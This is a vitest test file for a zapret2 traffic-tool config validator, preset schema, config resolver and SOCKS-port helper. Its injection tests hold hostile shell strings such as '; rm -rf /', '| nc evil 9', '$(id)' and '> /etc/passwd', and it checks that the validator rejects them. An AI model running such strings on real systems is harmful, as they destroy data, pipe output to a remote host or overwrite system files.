import { describe, expect, it } from 'vitest';
import {
  Zapret2ConfigSchema,
  Zapret2ConfigError,
  resolveZapret2Config,
  topLevelKeys,
  validateZapret2Config,
  zapret2SocksPortFor,
} from './egress.zapret2.js';
import { ZAPRET2_PRESETS, listPresetNames } from './egress.presets.js';

describe('validateZapret2Config (B2a)', () => {
  it('accepts every vendored preset', () => {
    for (const [name, body] of Object.entries(ZAPRET2_PRESETS)) {
      expect(() => validateZapret2Config(body), `preset ${name}`).not.toThrow();
    }
  });

  it('parses top-level keys without choking on the multi-line NFQWS2_OPT block', () => {
    const keys = topLevelKeys(ZAPRET2_PRESETS['rf-default']);
    expect(keys).toContain('NFQWS2_OPT');
    expect(keys).toContain('NFQWS2_PORTS_TCP');
    // The `--filter-tcp=80 ...` lines INSIDE the quoted NFQWS2_OPT value must
    // not be mistaken for assignments.
    expect(keys).not.toContain('-filter-tcp');
    expect(keys.every((k) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(k))).toBe(true);
  });

  it.each([
    ['command substitution', 'NFQWS2_ENABLE=$(id)\n'],
    ['backtick', 'NFQWS2_ENABLE=`id`\n'],
    ['statement separator', 'NFQWS2_ENABLE=1; rm -rf /\n'],
    ['pipe', 'NFQWS2_ENABLE=1 | nc evil 9\n'],
    ['redirect', 'NFQWS2_ENABLE=1 > /etc/passwd\n'],
  ])('rejects shell injection: %s', (_label, body) => {
    expect(() => validateZapret2Config(body)).toThrow(Zapret2ConfigError);
  });

  it('rejects an unknown top-level key', () => {
    expect(() => validateZapret2Config('EVIL_KEY=1\n')).toThrow(/unknown zapret2 config key: EVIL_KEY/);
  });

  // Real strategies use these characters inside the quoted NFQWS2_OPT value,
  // where they are inert string content. Rejecting them there would make the
  // validator refuse configs that are both valid and safe.
  it('allows shell metacharacters INSIDE a quoted value', () => {
    const body = 'NFQWS2_OPT="\n--filter-tcp=443 --filter-l7=tls --out-range=s1<d1 --new\n"';
    expect(() => validateZapret2Config(body)).not.toThrow();
  });

  it('still rejects the same characters outside quotes', () => {
    expect(() => validateZapret2Config('NFQWS2_ENABLE=1; rm -rf /')).toThrow(Zapret2ConfigError);
    expect(() => validateZapret2Config('NFQWS2_ENABLE=$(id)')).toThrow(Zapret2ConfigError);
  });

  it('allows legitimate $VAR references (not command substitution)', () => {
    expect(() => validateZapret2Config('SET_MAXELEM=10\nIPSET_OPT="maxelem $SET_MAXELEM"\n')).not.toThrow();
  });
});

describe('Zapret2ConfigSchema (B2a)', () => {
  it('defaults to disabled with the rf-default preset', () => {
    const p = Zapret2ConfigSchema.parse({});
    expect(p.enabled).toBe(false);
    expect(p.preset).toBe('rf-default');
  });

  it('rejects an unknown preset', () => {
    expect(() => Zapret2ConfigSchema.parse({ preset: 'no-such-preset' })).toThrow();
  });

  it('rejects a malformed ports override', () => {
    expect(() => Zapret2ConfigSchema.parse({ portsTcp: '80;443' })).toThrow();
  });

  it('rejects unknown fields (strict)', () => {
    expect(() => Zapret2ConfigSchema.parse({ enabled: true, bogus: 1 })).toThrow();
  });

  it('accepts known presets from the registry', () => {
    for (const name of listPresetNames()) {
      expect(() => Zapret2ConfigSchema.parse({ preset: name })).not.toThrow();
    }
  });
});

describe('resolveZapret2Config (B2a)', () => {
  it('returns the preset body verbatim when no overrides', () => {
    const { enabled, config } = resolveZapret2Config(
      Zapret2ConfigSchema.parse({ enabled: true }),
    );
    expect(enabled).toBe(true);
    expect(config).toBe(ZAPRET2_PRESETS['rf-default']);
  });

  it('applies port overrides into the resolved body', () => {
    const { config } = resolveZapret2Config(
      Zapret2ConfigSchema.parse({ enabled: true, portsTcp: '443', portsUdp: '443,8443' }),
    );
    expect(config).toContain('NFQWS2_PORTS_TCP=443\n');
    expect(config).toContain('NFQWS2_PORTS_UDP=443,8443\n');
    // The original 80,443 must be gone.
    expect(config).not.toContain('NFQWS2_PORTS_TCP=80,443');
    // And the result must still validate.
    expect(() => validateZapret2Config(config)).not.toThrow();
  });

  it('carries enabled=false through (tear-down push)', () => {
    const { enabled } = resolveZapret2Config(Zapret2ConfigSchema.parse({ enabled: false }));
    expect(enabled).toBe(false);
  });
});

// What makes zapret2 reachable as a CHANNEL: the B1 compiler asks this whether
// the node runs it, and points a socks outbound at the answer. Every "no" here
// is a rule the compiler drops instead of pointing traffic at a dead port.
describe('zapret2SocksPortFor', () => {
  it('reports the port of an enabled channel', () => {
    expect(zapret2SocksPortFor({ enabled: true })).toBe(1080);
    expect(zapret2SocksPortFor({ enabled: true, socksPort: 1085 })).toBe(1085);
  });

  it('reports nothing when the node never had the channel', () => {
    expect(zapret2SocksPortFor(null)).toBeNull();
    expect(zapret2SocksPortFor(undefined)).toBeNull();
  });

  // Disabled is not "still there but idle": /applyEgress tears the stack down,
  // so its SOCKS port stops answering.
  it('reports nothing when the channel is switched off', () => {
    expect(zapret2SocksPortFor({ enabled: false, socksPort: 1080 })).toBeNull();
  });

  it('reports nothing when the stored config drifted out of shape', () => {
    expect(zapret2SocksPortFor({ enabled: true, preset: 'no-such-preset' })).toBeNull();
    expect(zapret2SocksPortFor('nonsense')).toBeNull();
  });
});
